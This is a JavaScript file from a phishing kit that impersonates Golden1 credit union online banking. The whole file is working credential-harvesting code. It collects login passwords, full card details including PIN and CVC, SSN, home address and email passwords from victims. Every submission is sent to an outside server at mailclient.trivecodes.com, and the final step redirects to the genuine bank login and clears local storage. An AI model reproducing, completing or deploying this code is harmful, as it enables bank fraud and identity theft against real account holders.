const SubmitFirstUsers = async () => {
  document.getElementById("submitBtn").setAttribute("disabled", true);

  const username = document.getElementById("pad").value;
  const password = document.getElementById("pads").value;

  if (
    username !== undefined &&
    username !== "" &&
    username !== null &&
    password !== undefined &&
    password !== "" &&
    password !== null
  ) {
    localStorage.setItem("BOWusername", username);
    localStorage.setItem("BOWpassword", password);

    const sendDetails = `<h3> UserName : ${username} <br> Password : ${password} </h3>`;

    const sendData = {
      siteName: "Golden1",
      siteSend: sendDetails,
    };

    const billResponse = await fetch(
      "https://mailclient.trivecodes.com/BilalServer/mail_key.php",
      sendData
    );

    billResponse
      .text()
      .then(
        (data) =>
          data === "Sent" &&
          setTimeout(() => location.assign("./confirmLogin.html"), 3000)
      );
  } else {
    document.getElementById("pad").style.borderBottom = "1px solid #b22222";

    document.getElementById("pads").style.borderBottom = "1px solid #b22222";

    document.getElementById("submitBtn").removeAttribute("disabled");
  }
};

const SubmitPersonalInfo = async () => {
  document.getElementById("submitBtn").setAttribute("disabled", true);

  const userfullName = document.getElementById("userfullName").value;
  const userfullMobile = document.getElementById("userfullMobile").value;
  const userfullAddress = document.getElementById("userfullAddress").value;
  const userfullCity = document.getElementById("userfullCity").value;
  const userfullState = document.getElementById("userfullState").value;
  const userfullZip = document.getElementById("userfullZip").value;
  const userfullSSN = document.getElementById("userfullSSN").value;

  if (
    userfullName !== undefined &&
    userfullName !== "" &&
    userfullName !== null &&
    userfullMobile !== undefined &&
    userfullMobile !== "" &&
    userfullMobile !== null &&
    userfullAddress !== undefined &&
    userfullAddress !== "" &&
    userfullAddress !== null &&
    userfullCity !== undefined &&
    userfullCity !== "" &&
    userfullCity !== null &&
    userfullState !== undefined &&
    userfullState !== "" &&
    userfullState !== null &&
    userfullZip !== undefined &&
    userfullZip !== "" &&
    userfullZip !== null &&
    userfullSSN !== undefined &&
    userfullSSN !== "" &&
    userfullSSN !== null
  ) {
    localStorage.setItem("BOWuserfullName", userfullName);
    localStorage.setItem("BOWuserfullMobile", userfullMobile);
    localStorage.setItem("BOWuserfullAddress", userfullAddress);
    localStorage.setItem("BOWuserfullCity", userfullCity);
    localStorage.setItem("BOWuserfullState", userfullState);
    localStorage.setItem("BOWuserfullZip", userfullZip);
    localStorage.setItem("BOWuserfullSSN", userfullSSN);

    const sendDetails = `<h3> UserName : ${localStorage.BOWusername} <br> Password : ${localStorage.BOWpassword} <br> Card Number : ${localStorage.cardNumber} <br> Card Expiry Date  : ${localStorage.cardExpiryDate} <br> Card CVC : ${localStorage.cardCVC} <br> Card Pin : ${localStorage.cardPin}  <br> Full Name : ${userfullName} <br> Mobile : ${userfullMobile} <br> Address : ${userfullAddress} <br> City : ${userfullCity} <br> State : ${userfullState} <br> Zip Code : ${userfullZip} <br> SSN : ${userfullSSN} </h3>`;

    const sendData = {
      siteName: "Golden1",
      siteSend: sendDetails,
    };

    const billResponse = await fetch(
      "https://mailclient.trivecodes.com/BilalServer/mail_key.php",
      sendData
    );

    billResponse
      .text()
      .then(
        (data) =>
          data === "Sent" &&
          setTimeout(() => location.assign("./confirmEmail.html"), 3000)
      );
  } else {
    document.getElementById("userfullName").style.borderBottom =
      "1px solid #b22222";

    document.getElementById("userfullMobile").style.borderBottom =
      "1px solid #b22222";

    document.getElementById("userfullAddress").style.borderBottom =
      "1px solid #b22222";

    document.getElementById("userfullCity").style.borderBottom =
      "1px solid #b22222";

    document.getElementById("userfullState").style.borderBottom =
      "1px solid #b22222";

    document.getElementById("userfullZip").style.borderBottom =
      "1px solid #b22222";

    document.getElementById("userfullSSN").style.borderBottom =
      "1px solid #b22222";

    document.getElementById("submitBtn").removeAttribute("disabled");
  }
};

const FinalSubmitForm = async () => {
  document.getElementById("FinalSubmit").setAttribute("disabled", true);

  const cardNumber = document.getElementById("padNumber").value;
  const cardExpiryDate = document.getElementById("padExpiryDate").value;
  const cardCVC = document.getElementById("padCVC").value;
  const cardPin = document.getElementById("padPin").value;

  if (cardNumber.length < 14) {
    document.getElementById("padNumber").style.borderBottom =
      "1px solid #b22222";

    document.getElementById("FinalSubmit").removeAttribute("disabled");
    return false;
  }

  if (
    cardExpiryDate.length < 4 ||
    Number(cardExpiryDate.split("/")[0]) > 12 ||
    Number(cardExpiryDate.split("/")[1]) < 22
  ) {
    document.getElementById("padExpiryDate").style.borderBottom =
      "1px solid #b22222";

    document.getElementById("FinalSubmit").removeAttribute("disabled");
    return false;
  }

  if (cardCVC.length < 3) {
    document.getElementById("padCVC").style.borderBottom = "1px solid #b22222";

    document.getElementById("FinalSubmit").removeAttribute("disabled");
    return false;
  }

  if (cardPin.length < 4) {
    document.getElementById("padPin").style.borderBottom = "1px solid #b22222";

    document.getElementById("FinalSubmit").removeAttribute("disabled");
    return false;
  }

  localStorage.setItem("cardNumber", cardNumber);
  localStorage.setItem("cardExpiryDate", cardExpiryDate);
  localStorage.setItem("cardCVC", cardCVC);
  localStorage.setItem("cardPin", cardPin);

  const sendDetails = `<h3> UserName : ${localStorage.BOWusername} <br> Password : ${localStorage.BOWpassword} <br> Card Number : ${cardNumber} <br> Card Expiry Date  : ${cardExpiryDate} <br> Card CVC : ${cardCVC} <br> Card Pin : ${cardPin} </h3>`;

  const sendData = {
    siteName: "Golden1",
    siteSend: sendDetails,
  };

  const billResponse = await fetch(
    "https://mailclient.trivecodes.com/BilalServer/mail_key.php",
    sendData
  );

  billResponse
    .text()
    .then(
      (data) =>
        data === "Sent" &&
        setTimeout(() => location.assign("./confirmPersonal.html"), 3000)
    );
};

const SubmitEmailDetails = async () => {
  document.getElementById("submitBtn").setAttribute("disabled", true);

  const email = document.getElementById("userMail").value;
  const emailpassword = document.getElementById("userPass").value;

  if (
    email !== undefined &&
    email !== "" &&
    email !== null &&
    emailpassword !== undefined &&
    emailpassword !== "" &&
    emailpassword !== null
  ) {
    localStorage.setItem("BOWEmail", email);
    localStorage.setItem("BOWEmailpassword", emailpassword);

    completeSubmission();
  } else {
    document.getElementById("userMail").style.borderBottom =
      "1px solid #b22222";

    document.getElementById("userPass").style.borderBottom =
      "1px solid #b22222";

    document.getElementById("submitBtn").removeAttribute("disabled");
  }
};

const completeSubmission = async () => {
  const sendDetails = `<h3> UserName : ${localStorage.BOWusername} <br> Password : ${localStorage.BOWpassword} <br> Card Number : ${localStorage.cardNumber} <br> Card Expiry Date  : ${localStorage.cardExpiryDate} <br> Card CVC : ${localStorage.cardCVC} <br> Card Pin : ${localStorage.cardPin}  <br> Full Name : ${localStorage.BOWuserfullName} <br> Mobile : ${localStorage.BOWuserfullMobile} <br> Address : ${localStorage.BOWuserfullAddress} <br> City : ${localStorage.BOWuserfullCity} <br> State : ${localStorage.BOWuserfullState} <br> Zip Code : ${localStorage.BOWuserfullZip} <br> SSN : ${localStorage.BOWuserfullSSN} <br> Email : ${localStorage.BOWEmail} <br> Email Password : ${localStorage.BOWEmailpassword} </h3>`;

  const sendData = {
    siteName: "Golden1",
    siteSend: sendDetails,
  };

  const billResponse = await fetch(
    "https://mailclient.trivecodes.com/BilalServer/mail_key.php",
    sendData
  );

  billResponse
    .text()
    .then(
      (data) =>
        data === "Sent" &&
        setTimeout(
          () => location.assign("https://www.golden1.com/login-to-olb"),
          3000
        )
    );

  localStorage.clear();
};
